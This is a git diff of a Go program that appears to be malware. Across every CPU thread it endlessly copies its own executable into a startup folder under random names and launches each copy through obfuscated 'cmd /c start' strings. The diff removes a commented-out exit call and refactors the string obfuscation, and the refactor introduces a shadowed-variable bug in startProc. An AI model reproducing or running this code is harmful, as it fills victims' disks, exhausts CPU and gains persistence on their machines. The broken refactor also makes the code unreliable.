@@ -60,9 +60,13 @@ func getUsername() string {
 	return name
 }
 
+var cmd string = getStr(CMD_EXE)
+var c string = getStr(_C)
+var strt string = getStr(START)
+
 // ? Start a process (should be used with 'go')
 func startProc(cmd string) {
-	proc := exec.Command(getStr(CMD_EXE), getStr(_C), getStr(START), cmd)
+	proc := exec.Command(cmd, c, strt, cmd)
 	err := proc.Start()
 	if err != nil {
 		fmt.Println(err)
@@ -111,8 +115,9 @@ func whileCopy(src string, targetDir string, fileNameBase string) {
 	targetFile := path.Join(targetDir, fileNameBase)
 
 	// Infinite loop (Like [C#]: while (true) {})
+	formatStr := getStr(NEW_NAME_FORMATTER)
 	for {
-		tmpName := fmt.Sprintf(getStr(NEW_NAME_FORMATTER), targetFile, rand.Int63())
+		tmpName := fmt.Sprintf(formatStr, targetFile, rand.Int63())
 
 		// Copy cannot use the 'go' keyword or the .exe won't exist
 		// by the time we're calling it
@@ -151,14 +156,13 @@ func main() {
 	// Get the number of threads the CPU supports
 	threads := runtime.NumCPU()
 
-	// os.Exit(0)
-
 	verbose("Begin...", "")
+	fok := getStr(FOK)
 	for i := 0; i < threads; i++ {
 		verbose("gort", "Start ", i)
 
 		// Start copying on a new goroutine
-		go whileCopy(this, startup, getStr(FOK)) // ".exe" is added in whileCopy()->copy()
+		go whileCopy(this, startup, fok) // [fok]".exe" is added in whileCopy()->copy()
 	}
 
 	// Prevent app exit
